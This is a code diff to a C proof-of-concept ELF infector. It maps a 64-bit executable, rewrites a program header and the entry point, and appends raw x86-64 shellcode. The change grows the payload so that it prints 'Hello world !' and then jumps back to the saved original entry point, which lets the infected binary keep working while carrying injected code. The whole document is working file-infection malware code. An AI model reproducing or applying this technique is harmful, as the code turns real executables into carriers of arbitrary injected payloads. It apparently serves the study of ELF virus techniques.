@@ -8,7 +8,7 @@
 #include <string.h>
 #include <stdlib.h>
 
-char payload[48] = "\xe8\x0f\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x20\x21\x0a\x00\x5e\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05";
+char payload[85] = "\xe8\x0f\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x20\x21\x0a\x00\x5e\x52\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xee\x05\x48\x31\xc0\x48\x3b\x05\xbb\xff\xff\xff\x74\x13\x5a\x56\x58\x48\x2b\x05\xaf\xff\xff\xff\x48\x03\x05\xb0\xff\xff\xff\xff\xe0\x5a\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05";
 
 int poc(char *filename)
 {
@@ -17,7 +17,7 @@ int poc(char *filename)
 	if (fd < 0)
 		return (1);
 	lstat(filename, &sb);
-	void *addr = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+	void *addr = mmap(NULL, sb.st_size + 85 + 8 * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 	Elf64_Ehdr *ehdr = addr;
 	Elf64_Phdr *phdr = (Elf64_Phdr *)(addr + ehdr->e_phoff);
 	int max = 0;
@@ -52,17 +52,20 @@ int poc(char *filename)
 				- entry_infect - vaddr_inject
 			*/
 			printf("p_vaddr - p_offset: %lx\n", phdr->p_vaddr - phdr->p_offset);
-			phdr->p_filesz = 48;
-			phdr->p_memsz = 48;
+			phdr->p_filesz = 85 + 8 * 2;
+			phdr->p_memsz = 85 + 8 * 2;
 			phdr->p_align = 0x1000;
-			ehdr->e_entry = (phdr->p_vaddr - phdr->p_offset) + sb.st_size;
-			memcpy(addr + sb.st_size, payload, 48);
+			Elf64_Addr old_entry = ehdr->e_entry;
+			ehdr->e_entry = (phdr->p_vaddr - phdr->p_offset) + sb.st_size + 8 * 2;
+			memcpy(addr + sb.st_size, &ehdr->e_entry, 8);
+			memcpy(addr + sb.st_size + 8, &old_entry, 8);
+			memcpy(addr + sb.st_size + 8 * 2, payload, 85);
 			break;
 		}
 		phdr += 1;
 		i++;
 	}
-	write(fd, addr, sb.st_size + 48);
+	write(fd, addr, sb.st_size + 85 + 8 * 2);
 	close(fd);
 	return (0);
 }
